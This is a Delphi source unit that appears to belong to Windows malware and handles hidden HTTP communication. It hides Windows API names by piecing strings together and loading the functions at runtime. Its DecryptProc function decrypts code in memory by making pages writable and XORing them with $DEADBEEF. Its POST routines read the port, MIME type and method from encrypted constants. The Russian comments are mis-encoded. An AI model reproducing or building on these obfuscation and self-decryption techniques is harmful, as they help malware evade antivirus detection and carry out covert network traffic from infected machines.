unit HttpWrk;

interface
uses
  Classes;

type
  TStringArray = array of string;

  function DecryptProc(const FuncAddr: Pointer; const Size: Cardinal): Boolean;
  function Http_PostURL(const URL, URLData: string): Boolean;
  function Http_PostURL2(const URL, URLData: string; Data: TMemoryStream): Boolean;
  function ParseURL(const lpszUrl: string): TStringArray;

 // function HttpPostURLThread(const URL, URLData: string): Boolean;


implementation

uses
  SysUtils, Windows, WinInet, httpsend, GlobalVar, Crypto;


const
  MAX_URL = 2084;

type

  PQueryThrInfo = ^TQueryThrInfo;
  TQueryThrInfo = record
    ThrID: DWORD;
    URL: string;
    URLData: string;
  end;


//var
//  pHTTPMethod: Pointer;


{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function _InternetCrackUrl(lpszUrl: PChar; dwUrlLength, dwFlags: DWORD;
                           var lpUrlComponents: TURLComponents): BOOL;
var
  hMod: HMODULE;
  sDllName, sFuncName: string;
  pInternetCrackUrl: function(lpszUrl: PChar; dwUrlLength, dwFlags: DWORD;
                              var lpUrlComponents: TURLComponents): BOOL; stdcall;

begin
  Result := False;

  sDllName := 'win';
  sDllName := sDllName + 'inet';
  sDllName := sDllName + '.dll';

  hMod := LoadLibrary(PChar(sDllName));
  if hMod <> 0 then
    begin
      sFuncName := 'Internet';
      sFuncName := sFuncName + 'Cra';
      sFuncName := sFuncName + 'ckUrlA';

      @pInternetCrackUrl := GetProcAddress(hMod, PChar(sFuncName));
      if Assigned(pInternetCrackUrl) then
         Result := pInternetCrackUrl(lpszUrl, dwUrlLength, dwFlags, lpUrlComponents);
    end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function ParseURL(const lpszUrl: string): TStringArray;
var
  lpszScheme      : array[0..INTERNET_MAX_SCHEME_LENGTH - 1] of Char;
  lpszHostName    : array[0..INTERNET_MAX_HOST_NAME_LENGTH - 1] of Char;
  lpszUserName    : array[0..INTERNET_MAX_USER_NAME_LENGTH - 1] of Char;
  lpszPassword    : array[0..INTERNET_MAX_PASSWORD_LENGTH - 1] of Char;
  lpszUrlPath     : array[0..INTERNET_MAX_PATH_LENGTH - 1] of Char;
  lpszExtraInfo   : array[0..1024 - 1] of Char;
  lpUrlComponents : TURLComponents;
begin
  ZeroMemory(@lpszScheme, SizeOf(lpszScheme));
  ZeroMemory(@lpszHostName, SizeOf(lpszHostName));
  ZeroMemory(@lpszUserName, SizeOf(lpszUserName));
  ZeroMemory(@lpszPassword, SizeOf(lpszPassword));
  ZeroMemory(@lpszUrlPath, SizeOf(lpszUrlPath));
  ZeroMemory(@lpszExtraInfo, SizeOf(lpszExtraInfo));
  ZeroMemory(@lpUrlComponents, SizeOf(TURLComponents));

  lpUrlComponents.dwStructSize      := SizeOf(TURLComponents);
  lpUrlComponents.lpszScheme        := lpszScheme;
  lpUrlComponents.dwSchemeLength    := SizeOf(lpszScheme);
  lpUrlComponents.lpszHostName      := lpszHostName;
  lpUrlComponents.dwHostNameLength  := SizeOf(lpszHostName);
  lpUrlComponents.lpszUserName      := lpszUserName;
  lpUrlComponents.dwUserNameLength  := SizeOf(lpszUserName);
  lpUrlComponents.lpszPassword      := lpszPassword;
  lpUrlComponents.dwPasswordLength  := SizeOf(lpszPassword);
  lpUrlComponents.lpszUrlPath       := lpszUrlPath;
  lpUrlComponents.dwUrlPathLength   := SizeOf(lpszUrlPath);
  lpUrlComponents.lpszExtraInfo     := lpszExtraInfo;
  lpUrlComponents.dwExtraInfoLength := SizeOf(lpszExtraInfo);

  _InternetCrackUrl(PChar(lpszUrl), Length(lpszUrl), ICU_DECODE or ICU_ESCAPE, lpUrlComponents);

//  Writeln(Format('Protocol : %s',[lpszScheme]));
//  Writeln(Format('Host     : %s',[lpszHostName]));
//  Writeln(Format('User     : %s',[lpszUserName]));
//  Writeln(Format('Password : %s',[lpszPassword]));
//  Writeln(Format('Path     : %s',[lpszUrlPath]));
//  Writeln(Format('ExtraInfo: %s',[lpszExtraInfo]));

  SetLength(Result, 2);
  Result[0] := lpszHostName;
  Result[1] := StrPas(lpszUrlPath) + StrPas(lpszExtraInfo);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function DecryptProc(const FuncAddr: Pointer; const Size: Cardinal): Boolean;
var
  OldProtect, OldCallAddr: Cardinal;
  //NewCallValue: Cardinal;
  i: Cardinal;
begin
  Result := False;
  if FuncAddr = nil then
     Exit;

  OldCallAddr := Cardinal(FuncAddr);
  try
   { ������� ������ �� ������ }
    if not VirtualProtect(Pointer(OldCallAddr), Size,
                          PAGE_EXECUTE_READWRITE, OldProtect) then
       raise Exception.Create('');

    i := OldCallAddr;
    while i < OldCallAddr + Size do
    begin
      PDWORD(i)^ := PDWORD(i)^ xor $DEADBEEF;
      Inc(i, 4);
    end;

   { ���������� �� ����� ������ }
    VirtualProtect(Pointer(OldCallAddr), Size, OldProtect, OldProtect);
    Result := True;
  except
    //
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function Http_PostURL(const URL, URLData: string): Boolean;
var
  HTTP: THTTPSend;
  Data: TMemoryStream;
  ParsedUrl: TStringArray;
begin
  HTTP := THTTPSend.Create;
  Data := TMemoryStream.Create;
  ParsedUrl := ParseUrl(URL);
  with HTTP do
  try
    TargetHost := ParsedUrl[0];
    TargetPort := DecStr(HTTP_PORT);
    Document.Write(Pointer(URLData)^, Length(URLData));
    MimeType := DecStr(HTTP_MIME);
    Result   := HTTPMethod(DecStr(HTTP_METH), URL);
    Data.CopyFrom(Document, 0);
  finally
    HTTP.Free;
    Data.Free;
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function Http_PostURL2(const URL, URLData: string; Data: TMemoryStream): Boolean;
var
  HTTP: THTTPSend;
  ParsedUrl: TStringArray;
begin
  HTTP := THTTPSend.Create;
  //Data := TMemoryStream.Create;
  ParsedUrl := ParseUrl(URL);
  with HTTP do
  try
    TargetHost := ParsedUrl[0];
    TargetPort := DecStr(HTTP_PORT);
    Document.Write(Pointer(URLData)^, Length(URLData));
    MimeType := DecStr(HTTP_MIME);
    Result   := HTTPMethod(DecStr(HTTP_METH), URL);
    //Data.CopyFrom(Document, 0);
  finally
    HTTP.Free;
    //Data.Free;
  end;
end;


{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
//function SendIDThreadProc(p: Pointer): LongInt; stdcall;
//var
//  sUrl, sUrlData: string;
//begin
//  Result := 0;
//
//  sUrl     := PQueryThrInfo(p)^.URL;
//  sUrlData := PQueryThrInfo(p)^.URLData;
//  HttpPostURL(sUrl, sUrlData);
//end;
//
//{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
//function HttpPostURLThread(const URL, URLData: string): Boolean;
//var
//  pFunc: Pointer;
//  pThrInfo: PQueryThrInfo;
//begin
// { �������������� ��������� � ������ ����� ��� �������� http ������� }
//  pFunc := @SendIDThreadProc;
////  GetMem(pThrInfo, SizeOf(TQueryThrInfo));
////  pThrInfo^.ThrID   := 0;
////  SetLength(pThrInfo^.URL, Length(URL));
////  pThrInfo^.URL     := URL;
////  pThrInfo^.URLData := URLData;
//
////  Result := (CreateThread(nil, 0, pFunc, pThrInfo, 0, pThrInfo^.ThrID) <> 0);
//end;


initialization
//  pHTTPMethod := @THTTPSend.HTTPMethod;//Pointer($DEADBEEF);

end.
